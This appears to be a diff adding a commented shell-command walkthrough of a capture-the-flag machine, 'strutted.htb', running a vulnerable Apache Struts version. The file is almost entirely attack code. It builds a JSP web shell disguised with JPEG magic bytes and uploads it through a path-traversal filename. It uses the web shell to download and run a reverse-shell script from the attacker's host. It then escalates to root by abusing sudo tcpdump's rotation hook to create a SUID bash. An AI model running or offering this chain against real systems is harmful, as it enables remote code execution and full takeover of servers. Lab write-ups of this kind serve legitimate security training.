@@ -1,0 +1,100 @@
+# Initial recon - ping to check if host is up and save output
+ping -c3 10.10.11.59 > ping_output.txt
+
+# Full port scan with nmap, aggressive timing (-T4) and high rate for speed
+nmap -p- -T4 --min-rate 10000 10.10.11.59 -oN allports.nmap -oN services.nmap
+
+# Add hostname to /etc/hosts file for DNS resolution
+echo "10.10.11.59  strutted.htb" | sudo tee -a /etc/hosts
+
+# Directory/file enumeration using ffuf
+# -u: target URL with FUZZ placeholder
+# -w: wordlist to use
+# -mc: match HTTP codes 200,301,302
+# -ac: automatically calibrate filtering
+# -t: number of concurrent threads
+# -o: output file in JSON format
+ffuf -u http://strutted.htb/FUZZ -w wordlists/common.txt -mc 200,301,302 -ac -t 80 -o ffuf-common.json
+
+# Download and extract application source code
+wget http://strutted.htb/download -O strutted.zip
+unzip strutted.zip -d code
+
+# Source code structure overview:
+code/
+├── Dockerfile                    ← two-stage build (maven → tomcat 9)
+├── README.md                     ← project blurb / usage
+├── context.xml                   ← Tomcat manager context (privileged)
+├── tomcat-users.xml              ← hard-coded manager credentials
+└── strutted/                     ← Maven web-app
+    ├── pom.xml                   ← Struts version 6.3.0.1  ⚠ vulnerable
+    ├── mvnw*, target/ …
+    └── src/main/
+        ├── java/org/strutted/htb/*.java
+        └── webapp/ … (JSPs, struts.xml)
+
+# Check for known Struts vulnerabilities
+https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=struts
+
+# Set up reverse shell listener variables
+export LHOST=10.10.14.106
+export LPORT=4444
+
+# Create malicious JSP shell
+# Add JPEG magic bytes to bypass image validation
+printf $'\xFF\xD8\xFF' > shell.jsp
+# Append JSP web shell code
+cat >> shell.jsp <<'EOF' <%@ page import="java.io.*"%>
+<%
+if (request.getParameter("cmd") != null) {
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    InputStream in = p.getInputStream(); int c;
+    while ((c = in.read()) != -1) { out.print((char)c); }
+}
+%>
+EOF
+
+# Verify JPEG magic bytes are present
+xxd -l 5 shell.jsp
+
+# Upload shell via path traversal vulnerability
+curl -k -X POST "http://strutted.htb/upload.action" \
+  -F "Upload=@shell.jsp;type=image/jpeg;filename=safe.jpg" \
+  -F "top.UploadFileName=../../shell.jsp"
+
+# Test shell by running 'id' command
+curl -s "http://strutted.htb/shell.jsp?cmd=id"
+
+# Start Python HTTP server for file transfer
+python3 -m http.server 8000 &
+
+# Start netcat listener for reverse shell
+nc -l 4444
+
+# Download reverse shell script via web shell
+curl "http://strutted.htb/shell.jsp?cmd=wget%20http://10.10.14.106:8000/rev.sh%20-O%20/dev/shm/rev.sh"
+# Make it executable
+curl "http://strutted.htb/shell.jsp?cmd=chmod%20+x%20/dev/shm/rev.sh"
+# Execute reverse shell
+curl "http://strutted.htb/shell.jsp?cmd=bash%20/dev/shm/rev.sh"
+
+# Post-exploitation enumeration
+# List users with bash shell
+cat /etc/passwd | grep '/bin/bash'
+
+# Check sudo privileges
+sudo -l
+
+# Privilege escalation via tcpdump rotation feature
+# Create temp file with command to create SUID bash
+TF=$(mktemp)
+echo 'cp /bin/bash /tmp/rootshell; chmod 6777 /tmp/rootshell' > $TF
+chmod +x $TF
+
+# Trigger tcpdump rotation to execute our command as root
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+
+# Execute privileged shell and verify root access
+/tmp/rootshell -p
+id
+cat /root/root.txt
